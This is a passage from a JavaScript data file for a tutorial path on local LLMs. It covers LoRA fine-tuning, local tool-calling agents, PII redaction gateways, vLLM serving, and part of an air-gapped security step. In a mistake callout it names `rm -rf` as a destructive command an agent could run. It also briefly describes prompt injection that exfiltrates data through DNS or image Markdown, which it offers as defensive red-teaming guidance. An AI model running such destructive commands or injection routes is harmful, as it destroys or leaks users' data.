          "Use the 'LIMA' principle (Less Is More for Alignment): 1,000 exceptionally crafted, diverse prompt-response pairs produce a more capable fine-tune than 50,000 mediocre pairs.",
          "Use an advanced local model (like Qwen 2.5 32B) to critique and rewrite low-quality answers in your dataset before fine-tuning.",
          "Format multi-turn interactions using the ShareGPT format; it teaches models to maintain context and conversational continuity across dialogue turns."
        ]
      },
      promptLab: {
        recommendedModel: "Claude 3.7 Sonnet / Local Distilabel Pipeline",
        variables: [
          {
            id: "domainFocus",
            label: "Fine-Tuning Domain Target",
            options: [
              "Internal Enterprise API & SDK Documentation",
              "Customer Support Ticket Triage & Resolution",
              "Legal Clause Classification & Risk Auditing",
              "Specialized Medical Diagnosis Reporting"
            ],
            defaultOption: "Internal Enterprise API & SDK Documentation"
          },
          {
            id: "formatSchema",
            label: "Dataset Target Schema",
            options: [
              "ShareGPT Multi-Turn Format (conversations array)",
              "Alpaca Format (instruction, input, output)",
              "OpenAI Fine-Tuning Format (messages array)"
            ],
            defaultOption: "ShareGPT Multi-Turn Format (conversations array)"
          },
          {
            id: "syntheticRatio",
            label: "Data Source Composition",
            options: [
              "100% Curated First-Party Proprietary Logs",
              "Hybrid: 50% Internal Logs + 50% Synthetic Edge-Cases",
              "100% High-Entropy Synthetic Instruction Pairs"
            ],
            defaultOption: "Hybrid: 50% Internal Logs + 50% Synthetic Edge-Cases"
          }
        ],
        template: "# Synthetic Instruction Dataset Generation Prompt\n\nAct as a Principal Machine Learning Data Engineer. I am curating a fine-tuning dataset for [domainFocus] structured in [formatSchema] using a [syntheticRatio] strategy.\n\nGenerate 3 publication-grade instruction-response training examples:\n1. Adhere strictly to the [formatSchema] JSON specification.\n2. Ensure the prompt represents a realistic, challenging real-world developer or user inquiry.\n3. Ensure the response demonstrates perfect domain accuracy, strict tone consistency, and zero conversational fluff.\n4. Output valid JSONL format with one record per line.",
        expectedOutputs: [
          "Validated JSONL instruction examples conforming to ShareGPT specification",
          "Pydantic data validation schema verifying structural compliance",
          "De-duplication and PII scrubbing script instructions"
        ]
      },
      learning: {
        resources: [
          {
            title: "Hugging Face: Preparing Datasets for Supervised Fine-Tuning (SFT)",
            badge: "OFFICIAL DOCS",
            url: "https://huggingface.co/docs/trl/main/en/sft_trainer"
          },
          {
            title: "Argilla: Open Source Data Curation for LLMs",
            badge: "GITHUB",
            url: "https://github.com/argilla-io/argilla"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Instruction Tuning Datasets",
        overview: "Base language models are trained on raw internet text to perform unsupervised next-token prediction. Supervised Fine-Tuning (SFT) transforms these raw completions into reliable assistants by training them on curated question-and-answer pairs. The structure of this dataset determines the model's tone, formatting adherence, and problem-solving methodology. Clean datasets with high linguistic entropy teach the model generalized problem-solving patterns rather than mere rote memorization.",
        keyPoints: [
          {
            lead: "The ShareGPT Schema",
            text: "Standardizes multi-turn conversations into an array of role-value pairs, teaching models to maintain state across conversational turns."
          },
          {
            lead: "Synthetic Data Augmentation",
            text: "Using frontier models to generate adversarial edge-cases expands dataset coverage into rare failure modes that production logs miss."
          },
          {
            lead: "Data Deduplication",
            text: "Eliminating identical or near-duplicate prompts prevents models from overfitting and degenerating into repetitive token loops."
          }
        ]
      }
    },

    // Node 11
    {
      id: "step-11",
      stepNumber: 11,
      phaseId: "phase-3",
      title: "Fast LoRA & QLoRA Fine-Tuning on Consumer Hardware",
      timeEstimate: "90 mins",
      difficulty: "Advanced",
      summary: "Train custom domain adapters 2x faster with 70% less VRAM and export the merged weights directly to GGUF format.",
      description: "Full fine-tuning of an LLM requires updating all billions of weights, demanding massive clusters of enterprise GPUs. Low-Rank Adaptation (LoRA) and Quantized LoRA (QLoRA) revolutionized training by freezing the base model weights at 4-bit precision and training small, lightweight low-rank adapter matrices (typically under 100MB). Using open-source libraries like Unsloth, developers can fine-tune a Llama 3 or Qwen model on a single consumer RTX 3090/4090 GPU in under two hours, then export the merged model directly to GGUF for instant local deployment in Ollama.",
      playbook: {
        setup: "Install Unsloth in a Python environment with PyTorch and CUDA support (`pip install unsloth`). Verify GPU access via `nvidia-smi`.",
        execute: "Load base model in 4-bit (`unsloth/Qwen2.5-Coder-14B-Instruct-bnb-4bit`). Attach LoRA adapters with rank `r=16`, `lora_alpha=32`, targeting all linear layers (`q_proj`, `k_proj`, `v_proj`, `o_proj`, etc.). Run training with `SFTTrainer` for 3 epochs on your curated JSONL dataset.",
        verify: "Save and merge the trained LoRA adapter directly to 16-bit or GGUF format (`model.save_pretrained_gguf('custom-model', tokenizer, quantization_method='q4_k_m')`). Test the exported GGUF model in Ollama."
      },
      tools: [
        {
          name: "Unsloth",
          type: "Free",
          url: "https://unsloth.ai",
          description: "Hyper-optimized fine-tuning framework providing 2x-5x faster training speeds and 70% lower VRAM usage with zero accuracy loss.",
          bestFor: "Fast consumer GPU fine-tuning & GGUF direct export"
        },
        {
          name: "Axolotl",
          type: "Free",
          url: "https://github.com/axolotl-ai-cloud/axolotl",
          description: "Battle-tested enterprise post-training harness supporting diverse architectures, DPO, PPO, and multi-GPU distributed training.",
          bestFor: "Enterprise multi-GPU fine-tuning configurations"
        },
        {
          name: "LLaMA-Factory",
          type: "Free",
          url: "https://github.com/hiyouga/LLaMA-Factory",
          description: "All-in-one visual web GUI and training toolkit for fine-tuning, evaluating, and exporting over 100 open-weight model architectures.",
          bestFor: "Visual no-code / low-code model fine-tuning interface"
        }
      ],
      callouts: {
        mistake: "Setting the LoRA rank (`r`) unnecessarily high (e.g. `r=256`), which causes severe overfitting, ballooning VRAM consumption, and slow training.",
        proTip: "Target all linear projection modules (`q, k, v, o, gate, up, down`) with a moderate rank (`r=16` or `32`): this captures 98% of full fine-tuning performance while training in 1/5th the time.",
        mistakes: [
          "Setting the LoRA rank (`r`) unnecessarily high (e.g. `r=256`), which causes severe overfitting, ballooning VRAM consumption, and slow training.",
          "Failing to merge the LoRA weights back into the base model before export, producing broken adapter files that fail to load in Ollama.",
          "Using a learning rate that is too high (> 2e-4), causing catastrophic forgetting of the base model's conversational and reasoning capabilities."
        ],
        proTips: [
          "Target all linear projection modules (`q, k, v, o, gate, up, down`) with a moderate rank (`r=16` or `32`): this captures 98% of full fine-tuning performance while training in 1/5th the time.",
          "Unsloth provides native GGUF export: you can export directly to `q4_k_m` or `q8_0` with a single Python line, eliminating manual llama.cpp compilation.",
          "Track training loss curves using Weights & Biases (W&B): training loss should decay smoothly without sudden plateaus or sharp upward divergence."
        ]
      },
      promptLab: {
        recommendedModel: "Unsloth Python Script on RTX 3090 / 4090",
        variables: [
          {
            id: "targetBase",
            label: "Base Architecture",
            options: [
              "Qwen 2.5 Coder 14B (Optimal coding fine-tune)",
              "Llama 3.1 8B Instruct (Fastest consumer training)",
              "DeepSeek-R1-Distill-Qwen-14B (Reasoning fine-tune)",
              "Mistral NeMo 12B (Multilingual commercial)"
            ],
            defaultOption: "Qwen 2.5 Coder 14B (Optimal coding fine-tune)"
          },
          {
            id: "gpuHardware",
            label: "Training Hardware VRAM",
            options: [
              "Single 24GB GPU (NVIDIA RTX 3090 / 4090)",
              "Single 16GB GPU (NVIDIA RTX 4080 / 4070 Ti Super)",
              "Cloud GPU Pod (A100 80GB SXM / H100)"
            ],
            defaultOption: "Single 24GB GPU (NVIDIA RTX 3090 / 4090)"
          },
          {
            id: "loraRank",
            label: "LoRA Rank & Scaling Parameter",
            options: [
              "r=16, alpha=32 (Recommended standard for domain alignment)",
              "r=32, alpha=64 (Expanded capacity for complex syntax)",
              "r=8, alpha=16 (Minimal VRAM footprint for lightweight adapters)"
            ],
            defaultOption: "r=16, alpha=32 (Recommended standard for domain alignment)"
          }
        ],
        template: "# Complete Unsloth QLoRA Training Script\n\nfrom unsloth import FastLanguageModel\nimport torch\n\nmax_seq_length = 4096\nmodel, tokenizer = FastLanguageModel.from_pretrained(\n    model_name = \"unsloth/[targetBase]\",\n    max_seq_length = max_seq_length,\n    load_in_4bit = True,\n)\n\n# Configure LoRA Adapters for [gpuHardware]\nmodel = FastLanguageModel.get_peft_model(\n    model,\n    [loraRank],\n    target_modules = [\"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\",\n                      \"gate_proj\", \"up_proj\", \"down_proj\"],\n    lora_dropout = 0,\n    bias = \"none\",\n    use_gradient_checkpointing = \"unsloth\",\n)\n\n# Export directly to 4-bit GGUF for Ollama deployment\n# model.save_pretrained_gguf(\"fine-tuned-model\", tokenizer, quantization_method=\"q4_k_m\")",
        expectedOutputs: [
          "Complete, runnable Unsloth Python fine-tuning script with optimal hyperparameters",
          "VRAM memory consumption calculation for 24GB GPU",
          "Direct GGUF export command for instant deployment to Ollama"
        ]
      },
      learning: {
        resources: [
          {
            title: "Unsloth: Official Documentation & Fast LoRA Guides",
            badge: "OFFICIAL DOCS",
            url: "https://docs.unsloth.ai"
          },
          {
            title: "Hugging Face PEFT: Parameter-Efficient Fine-Tuning Guide",
            badge: "GUIDE",
            url: "https://huggingface.co/docs/peft/index"
          }
        ]
      },
      conceptGuide: {
        title: "The Mathematical Foundations of LoRA and QLoRA",
        overview: "When deep neural networks adapt to downstream tasks, the changes to their weight matrices (ΔW) possess a low 'intrinsic rank'. Parameter-Efficient Fine-Tuning (PEFT) leverages this by decomposing the full update matrix ΔW (dimensions d × k) into two tiny low-rank matrices A and B (dimensions d × r and r × k), where the rank r is drastically smaller than d. QLoRA extends this by quantizing the base model parameters to NormalFloat4 (NF4) and using Double Quantization and Paged Optimizers to prevent memory spikes during gradient updates.",
        keyPoints: [
          {
            lead: "Matrix Rank Decomposition",
            text: "Instead of training a 14-billion parameter matrix, LoRA trains two tiny matrices whose product updates the target layer with 99% fewer parameters."
          },
          {
            lead: "Zero Inference Latency Overhead",
            text: "Upon completing training, adapter matrices A and B are mathematically added directly back into base weights: W_final = W_base + (B × A)."
          },
          {
            lead: "Catastrophic Forgetting Mitigation",
            text: "Because the original base model weights are frozen, the model retains its core natural language capabilities while absorbing domain syntax."
          }
        ]
      }
    },

    // Node 12
    {
      id: "step-12",
      stepNumber: 12,
      phaseId: "phase-3",
      title: "Local Function Calling & Offline MCP Agent Workflows",
      timeEstimate: "50 mins",
      difficulty: "Intermediate",
      summary: "Building autonomous local agents that execute shell scripts, query local SQLite/Postgres databases, and orchestrate tasks offline.",
      description: "Language models become exponentially more useful when they can take actions: executing shell commands, querying local databases, or controlling system applications. Anthropic's open Model Context Protocol (MCP) and native JSON function-calling enable local open-weight models (such as Qwen 2.5 and Llama 3.1) to reliably parse tool definitions, emit validated structured tool-call arguments, and orchestrate autonomous execution loops completely disconnected from cloud services.",
      playbook: {
        setup: "Verify your local model supports function calling (Qwen 2.5 and Llama 3.1 have native tool-calling tokens in Ollama). Install PydanticAI or an MCP-compatible agent harness.",
        execute: "Define local tools as Python functions with Pydantic type annotations (e.g. `query_local_sqlite(sql: str)` or `run_git_status()`). Pass tool schemas to Ollama via the API `tools` parameter. Implement the execution loop that runs the tool locally and returns the output to the model.",
        verify: "Prompt the model: 'What git branch am I currently on, and what tables exist in our local sqlite database?' Verify the model invokes both tools sequentially and synthesizes the correct final response."
      },
      tools: [
        {
          name: "Ollama Tool Calling",
          type: "Free",
          url: "https://ollama.com/blog/tool-support",
          description: "Native function-calling support in Ollama allowing models to output structured JSON tool calls matching predefined schemas.",
          bestFor: "Local model tool calling & structured execution"
        },
        {
          name: "n8n Self-Hosted",
          type: "Free",
          url: "https://n8n.io",
          description: "Open-source visual workflow automation platform that connects local Ollama models directly to local databases, webhooks, and scripts.",
          bestFor: "Visual offline agent orchestration & webhook integration"
        },
        {
          name: "PydanticAI",
          type: "Free",
          url: "https://ai.pydantic.dev",
          description: "Python agent framework built by the Pydantic team designed for type-safe tool calling, structured outputs, and local model integration.",
          bestFor: "Type-safe Python local agent loops & structured validation"
        }
      ],
      callouts: {
        mistake: "Giving a local agent unrestricted shell execution privileges (`rm -rf` or arbitrary bash commands) without a human-in-the-loop approval confirmation.",
        proTip: "Qwen 2.5 14B and 32B models have the highest open-source tool-calling benchmark accuracy, matching GPT-4o on JSON argument syntax compliance.",
        mistakes: [
          "Giving a local agent unrestricted shell execution privileges (`rm -rf` or arbitrary bash commands) without a human-in-the-loop approval confirmation.",
          "Failing to provide clear docstrings and parameter descriptions in your tool schema, causing the model to guess argument names incorrectly.",
          "Letting an agent loop indefinitely on failed tool outputs without setting a maximum iteration ceiling (e.g. `max_iterations = 5`)."
        ],
        proTips: [
          "Qwen 2.5 14B and 32B models have the highest open-source tool-calling benchmark accuracy, matching GPT-4o on JSON argument syntax compliance.",
          "Use Pydantic to validate tool arguments automatically: if the model generates a malformed string, Pydantic catches it and re-prompts the model with the error.",
          "Connect local models to Model Context Protocol (MCP) servers to give your local LLM direct access to local filesystem, git, and SQLite tools."
        ]
      },
      promptLab: {
        recommendedModel: "Ollama Qwen-2.5-14B / Llama-3.1-70B",
        variables: [
          {
            id: "agentTool",
            label: "Local Action Capability",
            options: [
              "Local SQLite / PostgreSQL Database Querying",
              "File System & Git Workspace Inspection",
              "Local Network Ping & Port Diagnostic Scanner",
              "System Hardware Metric Inspection (GPU/CPU/RAM)"
            ],
            defaultOption: "Local SQLite / PostgreSQL Database Querying"
          },
          {
            id: "frameworkHarness",
            label: "Agent Framework",
            options: [
              "PydanticAI (Type-Safe Python)",
              "Native Ollama REST API Loop (cURL / Python requests)",
              "n8n Self-Hosted Visual AI Agent"
            ],
            defaultOption: "PydanticAI (Type-Safe Python)"
          },
          {
            id: "safetyGuardrail",
            label: "Execution Permission Tier",
            options: [
              "Strict Read-Only (SELECT queries only, mutations rejected)",
              "Human Approval Required for Destructive Operations",
              "Autonomous Sandboxed Execution inside Docker container"
            ],
            defaultOption: "Strict Read-Only (SELECT queries only, mutations rejected)"
          }
        ],
        template: "# Complete Local Function Calling Agent Loop\n\nfrom pydantic_ai import Agent, RunContext\nfrom pydantic import BaseModel, Field\nimport sqlite3\n\n# Configure agent with local Ollama provider\nagent = Agent(\n    'ollama:qwen2.5-coder:14b',\n    system_prompt='You are a local autonomous systems engineer. Use tools to inspect data. Obey [safetyGuardrail].'\n)\n\n@agent.tool\ndef [agentTool](ctx: RunContext[None], query: str = Field(description=\"SQL query to execute\")) -> str:\n    \"\"\"Execute a [safetyGuardrail] inspection on the local database.\"\"\"\n    # Verify query and execute locally with zero network transmission\n    return f\"Results for query: {query}\"\n\n# Run local agent\nresult = agent.run_sync(\"Analyze the latest 5 user registrations and report anomalies.\")\nprint(result.data)",
        expectedOutputs: [
          "Complete Python script defining local tool schemas and execution loop",
          "Structured JSON tool-calling response payload from local Ollama model",
          "Verification of safety guardrail blocking unauthorized mutation commands"
        ]
      },
      learning: {
        resources: [
          {
            title: "Ollama: Official Function Calling & Tool Support Documentation",
            badge: "OFFICIAL DOCS",
            url: "https://ollama.com/blog/tool-support"
          },
          {
            title: "Model Context Protocol (MCP): Official Specification",
            badge: "GUIDE",
            url: "https://modelcontextprotocol.io"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Structured Function Calling in LLMs",
        overview: "Language models do not naturally execute code or access computers; they predict strings of text. Function calling bridges this divide through constrained token decoding. The model is primed with a JSON schema describing available functions. When prompted with a task requiring external data, the model halts normal prose generation and outputs a structured JSON payload conforming to the tool schema. The host application intercepts this payload, executes the function locally, and returns the output to the model context.",
        keyPoints: [
          {
            lead: "Constrained JSON Grammar",
            text: "Runtimes enforce strict context-free grammars (GBNF) ensuring the model cannot output malformed or invalid JSON syntax."
          },
          {
            lead: "The ReAct Loop Paradigm",
            text: "Reasoning and Acting (ReAct) alternates between internal thought, tool action, and observation parsing until the goal is achieved."
          },
          {
            lead: "Local Air-Gapped Security",
            text: "Executing tools locally eliminates the credential leakage risk of sharing database passwords or API keys with external cloud servers."
          }
        ]
      }
    },

    // Node 13
    {
      id: "step-13",
      stepNumber: 13,
      phaseId: "phase-4",
      title: "Automated PII Redaction & Hybrid Cloud Gateways",
      timeEstimate: "45 mins",
      difficulty: "Intermediate",
      summary: "Automatically strip names, credit cards, API keys, and medical data locally before routing complex queries to external APIs.",
      description: "While local models provide absolute privacy, frontier proprietary cloud models (Claude 3.7 Sonnet, GPT-4o) still hold an edge in massive enterprise multi-modal reasoning. A Hybrid Privacy Architecture delivers the best of both worlds: user queries are first processed on an on-premise local gateway that detects and masks Personally Identifiable Information (PII) using Microsoft Presidio, sends only sanitized anonymized prompts to cloud APIs, and de-anonymizes the response locally before displaying it to the user.",
      playbook: {
        setup: "Install Microsoft Presidio Analyzer and Anonymizer (`pip install presidio-analyzer presidio-anonymizer`) and LiteLLM (`pip install litellm`).",
        execute: "Configure a local proxy pipeline: Ingest the user prompt, run Presidio NER (Named Entity Recognition) to detect emails, phone numbers, credit cards, and names, and replace them with synthetic placeholder tokens (e.g., `<PERSON_1>`, `<EMAIL_1>`). Route the sanitized prompt to the cloud LLM.",
        verify: "Send a test prompt containing fake customer credit card numbers and medical patient names. Inspect the outgoing HTTP payload in Wireshark or LiteLLM logs: confirm that 100% of sensitive PII was replaced by cryptographic tokens."
      },
      tools: [
        {
          name: "Microsoft Presidio",
          type: "Free",
          url: "https://microsoft.github.io/presidio/",
          description: "Open-source SDK and API for detecting, masking, and redacting Personally Identifiable Information (PII) in text and images.",
          bestFor: "Automated PII entity detection & reversible anonymization"
        },
        {
          name: "LiteLLM",
          type: "Free",
          url: "https://www.litellm.ai",
          description: "Lightweight proxy server standardizing API calls to over 100 LLMs with built-in PII masking, load balancing, and budget tracking.",
          bestFor: "Local gateway proxy & automated PII middleware"
        },
        {
          name: "Guardrails AI",
          type: "Free",
          url: "https://www.guardrailsai.com",
          description: "Open-source validation framework for adding structural guardrails, hallucination checks, and PII filters to LLM input/output streams.",
          bestFor: "Input/output data validation & structural security filters"
        }
      ],
      callouts: {
        mistake: "Using naive regex patterns to catch PII: regex easily misses names, medical conditions, and addresses that lack rigid numerical formats.",
        proTip: "Implement 'Reversible Anonymization': maintain a local in-memory session map (`<PERSON_1>` -> 'Alice Johnson') so when the cloud model responds, the local gateway swaps the real name back in seamlessly.",
        mistakes: [
          "Using naive regex patterns to catch PII: regex easily misses names, medical conditions, and addresses that lack rigid numerical formats.",
          "Sending sensitive internal database schema column names and proprietary table structures to cloud models without obfuscation.",
          "Logging raw unredacted user prompts to disk in plain text log files on the proxy server."
        ],
        proTips: [
          "Implement 'Reversible Anonymization': maintain a local in-memory session map (`<PERSON_1>` -> 'Alice Johnson') so when the cloud model responds, the local gateway swaps the real name back in seamlessly.",
          "Combine SpaCy transformer models with Presidio for 99.4% precision on detecting international personal names and organization entities.",
          "Deploy LiteLLM Proxy in front of your entire team: enforce automatic PII scrubbing on all outgoing OpenAI and Anthropic requests by default."
        ]
      },
      promptLab: {
        recommendedModel: "Microsoft Presidio + LiteLLM + Claude 3.7",
        variables: [
          {
            id: "regulatoryStandard",
            label: "Compliance & Privacy Regulation",
            options: [
              "HIPAA (Protected Health Information - PHI)",
              "GDPR / CCPA (Personal Identifiers & Geolocation)",
              "PCI-DSS (Credit Card Numbers & Financial CVVs)",
              "Corporate IP & Secret API Key Protection"
            ],
            defaultOption: "GDPR / CCPA (Personal Identifiers & Geolocation)"
          },
          {
            id: "redactionMethod",
            label: "Anonymization Technique",
            options: [
              "Cryptographic Token Replacement (Reversible)",
              "Redaction Masking (Irreversible [REDACTED])",
              "Synthetic Entity Substitution (Faker generated)"
            ],
            defaultOption: "Cryptographic Token Replacement (Reversible)"
          },
          {
            id: "cloudDestination",
            label: "External Model Endpoint",
            options: [
              "Anthropic Claude 3.7 Sonnet API",
              "OpenAI GPT-4o / o3-mini API",
              "DeepSeek Cloud API"
            ],
            defaultOption: "Anthropic Claude 3.7 Sonnet API"
          }
        ],
        template: "# Production Hybrid Privacy Gateway Configuration (Python + Presidio)\n\nfrom presidio_analyzer import AnalyzerEngine\nfrom presidio_anonymizer import AnonymizerEngine\nfrom presidio_anonymizer.entities import OperatorConfig\n\nanalyzer = AnalyzerEngine()\nanonymizer = AnonymizerEngine()\n\ndef sanitize_prompt_for_cloud(raw_user_prompt: str):\n    # Analyze text for [regulatoryStandard] entities\n    results = analyzer.analyze(\n        text=raw_user_prompt,\n        entities=[\"PERSON\", \"EMAIL_ADDRESS\", \"PHONE_NUMBER\", \"CREDIT_CARD\", \"IP_ADDRESS\"],\n        language=\"en\"\n    )\n    \n    # Apply [redactionMethod]\n    anonymized_result = anonymizer.anonymize(\n        text=raw_user_prompt,\n        analyzer_results=results\n    )\n    return anonymized_result.text\n\n# Test with real PII sample\nsample = \"Customer John Smith (john.smith@gmail.com) reported card 4532-1234-5678-9010 declined.\"\nprint(\"Sanitized Payload for [cloudDestination]:\")\nprint(sanitize_prompt_for_cloud(sample))",
        expectedOutputs: [
          "Complete Python PII sanitization pipeline script",
          "Verification output showing complete replacement of sensitive entities",
          "Reversible de-anonymization lookup table for downstream response reconstruction"
        ]
      },
      learning: {
        resources: [
          {
            title: "Microsoft Presidio: Official Documentation & Architecture",
            badge: "OFFICIAL DOCS",
            url: "https://microsoft.github.io/presidio/"
          },
          {
            title: "LiteLLM: Enterprise Security & PII Redaction Proxy",
            badge: "GUIDE",
            url: "https://docs.litellm.ai/docs/proxy/pii_masking"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Hybrid Privacy-Preserving AI Gateways",
        overview: "A binary choice between purely local models and purely cloud models creates an unnecessary operational compromise. Local models provide confidentiality but may struggle with massive multi-hop reasoning; cloud models possess vast intelligence but expose confidential data to third-party data processing. A Hybrid Privacy Gateway acts as an intelligent intermediary. By operating an on-premise PII redaction layer at the network edge, organizations enforce strict regulatory compliance while maintaining access to state-of-the-art frontier models.",
        keyPoints: [
          {
            lead: "The Edge Scrubbing Rule",
            text: "No text string should ever cross your network gateway until it has been inspected and scrubbed by local Named Entity Recognition models."
          },
          {
            lead: "Entity Placeholder Mapping",
            text: "Replacing PII with structured identifiers (`<PERSON_1>`) preserves the semantic grammatical structure so the cloud LLM still comprehends the context."
          },
          {
            lead: "Auditable Compliance Trails",
            text: "Every outbound request is cryptographically logged in an air-gapped on-premise audit vault proving full GDPR and HIPAA compliance."
          }
        ]
      }
    },

    // Node 14
    {
      id: "step-14",
      stepNumber: 14,
      phaseId: "phase-4",
      title: "High-Throughput Multi-User Local Inference Serving",
      timeEstimate: "60 mins",
      difficulty: "Advanced",
      summary: "Scaling local open-weight models for team or production use with PagedAttention, continuous batching, and KV-cache optimization.",
      description: "While llama.cpp and Ollama are ideal for single-user desktop execution, they experience severe throughput bottlenecks when dozens of concurrent team members send simultaneous API requests. Serving open-weight models in enterprise production requires high-throughput inference engines like vLLM. Powered by PagedAttention (which manages KV-cache memory like virtual memory pages in an operating system) and continuous iteration-level batching, vLLM delivers up to 24x higher throughput on the exact same GPU hardware.",
      playbook: {
        setup: "Deploy an Ubuntu machine with NVIDIA GPU and install vLLM via pip (`pip install vllm`). Ensure CUDA 12+ drivers are active.",
        execute: "Launch a high-throughput OpenAI-compatible server: `vllm serve Qwen/Qwen2.5-Coder-14B-Instruct --gpu-memory-utilization 0.90 --max-model-len 8192 --port 8000`.",
        verify: "Run a concurrent load test using Apache Bench or Locust simulating 20 simultaneous users: `ab -n 100 -c 20 -p test_prompt.json -T application/json http://localhost:8000/v1/chat/completions`. Confirm stable sub-second latency and zero dropped connections."
      },
      tools: [
        {
          name: "vLLM",
          type: "Free",
          url: "https://vllm.ai",
          description: "High-throughput, memory-efficient LLM serving engine featuring PagedAttention, continuous batching, and tensor parallelism.",
          bestFor: "Enterprise multi-user serving & maximum token throughput"
        },
        {
          name: "Hugging Face TGI",
          type: "Free",
          url: "https://github.com/huggingface/text-generation-inference",
          description: "Text Generation Inference (TGI) is Hugging Face's production server powering enterprise Hugging Face endpoints with FlashAttention.",
          bestFor: "Production Docker deployment with integrated Prometheus metrics"
        },
        {
          name: "SGLang",
          type: "Free",
          url: "https://github.com/sgl-project/sglang",
          description: "Fast serving framework for complex multi-turn prompting, structured decoding, and high-performance reasoning models like DeepSeek.",
          bestFor: "Structured decoding & complex multi-turn reasoning pipelines"
        }
      ],
      callouts: {
        mistake: "Deploying Ollama in an enterprise web application with 50 concurrent users: Ollama queues requests sequentially, causing massive timeouts for users at the back of the queue.",
        proTip: "vLLM's PagedAttention reduces KV-cache memory waste from over 60% down to under 4%, allowing you to fit 5x more concurrent users in the exact same VRAM pool.",
        mistakes: [
          "Deploying Ollama in an enterprise web application with 50 concurrent users: Ollama queues requests sequentially, causing massive timeouts for users at the back of the queue.",
          "Setting `gpu_memory_utilization` to 1.0, triggering out-of-memory crashes as soon as input batches scale dynamically.",
          "Failing to enable Tensor Parallelism (`--tensor-parallel-size 2`) when running across multiple physical GPUs, leaving secondary cards idle."
        ],
        proTips: [
          "vLLM's PagedAttention reduces KV-cache memory waste from over 60% down to under 4%, allowing you to fit 5x more concurrent users in the exact same VRAM pool.",
          "Use speculative decoding (`--speculative-model qwen2.5-coder:1.5b`) in vLLM to accelerate generation speed of a 14B model by 1.8x.",
          "Export real-time Prometheus metrics directly from vLLM (`/metrics`) to visualize tokens/sec, queue depth, and cache saturation in Grafana."
        ]
      },
      promptLab: {
        recommendedModel: "vLLM Server with Qwen-2.5-Coder-32B or Llama-3.3-70B",
        variables: [
          {
            id: "serverEngine",
            label: "Inference Engine",
            options: [
              "vLLM (PagedAttention + Continuous Batching)",
              "Hugging Face TGI (Production Docker Container)",
              "SGLang (High-Performance Structured Decoding)"
            ],
            defaultOption: "vLLM (PagedAttention + Continuous Batching)"
          },
          {
            id: "gpuCluster",
            label: "Target GPU Topology",
            options: [
              "Single Enterprise GPU (1x NVIDIA A100 / RTX 4090)",
              "Dual GPU Setup (2x RTX 3090 / A6000 with Tensor Parallelism)",
              "Quad GPU Cluster (4x A100 80GB SXM with Pipeline Parallelism)"
            ],
            defaultOption: "Single Enterprise GPU (1x NVIDIA A100 / RTX 4090)"
          },
          {
            id: "concurrencyTarget",
            label: "Concurrent User Capacity",
            options: [
              "Team Tier (5 to 15 concurrent developers)",
              "Department Tier (25 to 50 concurrent users)",
              "Enterprise Production (100+ concurrent API streams)"
            ],
            defaultOption: "Team Tier (5 to 15 concurrent developers)"
          }
        ],
        template: "# Production Docker Compose Configuration for High-Throughput vLLM\n\nservices:\n  vllm:\n    image: vllm/vllm-openai:latest\n    container_name: vllm-server\n    runtime: nvidia\n    restart: always\n    ports:\n      - \"8000:8000\"\n    environment:\n      - HUGGING_FACE_HUB_TOKEN=${HF_TOKEN}\n    volumes:\n      - ~/.cache/huggingface:/root/.cache/huggingface\n    ipc: host\n    command: >\n      --model Qwen/Qwen2.5-Coder-14B-Instruct\n      --gpu-memory-utilization 0.92\n      --max-model-len 8192\n      --trust-remote-code\n      --enforce-eager\n      --port 8000\n    deploy:\n      resources:\n        reservations:\n          devices:\n            - driver: nvidia\n              count: all\n              capabilities: [gpu]",
        expectedOutputs: [
          "Complete production-ready docker-compose.yml file for vLLM",
          "Continuous batching performance configuration tuning flags",
          "Apache Bench load-testing script measuring concurrent requests/sec"
        ]
      },
      learning: {
        resources: [
          {
            title: "vLLM: Official Quickstart & Deployment Documentation",
            badge: "OFFICIAL DOCS",
            url: "https://docs.vllm.ai"
          },
          {
            title: "PagedAttention Paper: Efficient Memory Management for LLMs",
            badge: "GUIDE",
            url: "https://arxiv.org/abs/2309.06180"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of PagedAttention and Continuous Batching",
        overview: "In conventional LLM serving systems, memory is reserved contiguously for the maximum possible context length for each incoming request. If a request only uses 200 tokens out of a reserved 8,192, up to 95% of allocated VRAM sits completely wasted (internal fragmentation). Developed at UC Berkeley, PagedAttention draws inspiration from OS virtual memory paging: the KV-cache is sliced into non-contiguous fixed-size blocks (pages). This dynamic allocation allows multiple concurrent requests to share physical memory dynamically, increasing throughput up to 24x.",
        keyPoints: [
          {
            lead: "Virtual Memory Paging for KV Caches",
            text: "PagedAttention eliminates internal memory fragmentation, allowing GPUs to saturate their memory bandwidth with active computation."
          },
          {
            lead: "Continuous Iteration-Level Batching",
            text: "Rather than waiting for an entire batch of requests to finish, new incoming requests are dynamically inserted into the very next forward pass."
          },
          {
            lead: "Tensor Parallelism Across Multiple GPUs",
            text: "Splits model weight matrices across multiple physical GPUs, combining both memory bandwidth and capacity for ultra-fast serving."
          }
        ]
      }
    },

    // Node 15
    {
      id: "step-15",
      stepNumber: 15,
      phaseId: "phase-4",
      title: "Air-Gapped Security, Network Isolation & Red-Teaming",
      timeEstimate: "50 mins",
      difficulty: "Advanced",
      summary: "Enforce strict firewall rules to verify zero outbound telemetry and audit local models against prompt injection and data leakage.",
      description: "True privacy requires mathematical verification, not blind trust. Even open-source software and model weights can contain subtle telemetry pings, hidden tracking beacons, or prompt injection vulnerabilities that attempt to exfiltrate data via DNS lookup or image Markdown rendering. Achieving enterprise-grade air-gapped security requires deploying strict Docker network isolation (`--network none`), configuring egress firewall blockades, and executing automated red-team security audits using tools like Garak.",
      playbook: {
        setup: "Deploy your local model runtime inside a dedicated Docker container or isolated Linux network namespace (`ip netns`).",
        execute: "Enforce total network isolation: Launch the inference container with `--network none` or configure iptables to drop 100% of outbound WAN packets while permitting internal LAN loopback traffic. Audit the process using Little Snitch (macOS) or `tcpdump` to verify zero external DNS or TCP requests.",
        verify: "Run an automated red-team vulnerability scan using Garak (`garak --model_type rest --report_prefix audit`). Verify that prompt injection attempts, jailbreaks, and indirect data exfiltration vectors are blocked."
      },
      tools: [
        {
          name: "Docker Network Isolation",
          type: "Free",
          url: "https://docs.docker.com/network/",
          description: "Docker native network security flags (`--network none` and internal bridge networks) that mathematically sever all WAN internet access.",
          bestFor: "Container network isolation & total internet blockade"
        },
        {
          name: "Little Snitch",
          type: "Paid",
